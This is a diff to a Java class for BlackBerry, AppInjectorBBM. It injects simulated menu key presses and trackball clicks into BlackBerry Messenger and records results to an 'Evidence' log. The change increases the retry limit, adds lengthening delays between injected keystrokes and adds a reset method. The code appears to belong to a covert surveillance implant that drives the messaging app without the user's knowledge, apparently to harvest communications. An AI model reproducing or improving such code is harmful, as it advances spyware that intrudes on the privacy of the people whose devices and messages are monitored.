@@ -35,7 +35,10 @@ public class AppInjectorBBM implements AppInjectorInterface, Singleton {
     private static AppInjectorBBM instance;
     private static final long GUID = 0xcb37fa94a62baf5dL;
     private static final int DELAY = 5000;
+
+    private static final int MAX_TRIES = 12;
     
+    private int delay = 100;
     private int tries =0;
 
     public static synchronized AppInjectorBBM getInstance() {
@@ -80,10 +83,13 @@ public class AppInjectorBBM implements AppInjectorInterface, Singleton {
                 + UiApplication.getUiApplication().getActiveScreen());
         //#endif
 
-        if(tries++ >= 3){
+        if(tries >= MAX_TRIES){
             //#ifdef DEBUG
             debug.error("callMenuByKey: too many tries");
             //#endif
+            if(tries++ == MAX_TRIES){
+                Evidence.info("NO BBM");
+            }
             return false;
         }
         
@@ -91,9 +97,9 @@ public class AppInjectorBBM implements AppInjectorInterface, Singleton {
         debug.trace("callMenuByKey press raw key");
         //#endif
         KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
-        Utils.sleep(200);
+        Utils.sleep(delay + tries * 20);
         KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
-        Utils.sleep(200);
+        Utils.sleep(delay + tries * 20);
         KeyInjector.trackBallRawClick();
         //KeyInjector.trackBallClick();
 
@@ -128,6 +134,10 @@ public class AppInjectorBBM implements AppInjectorInterface, Singleton {
     public int getDelay() {
 
         return DELAY;
+    }
+
+    public void reset() {
+        tries = 0;
     }
 
 }
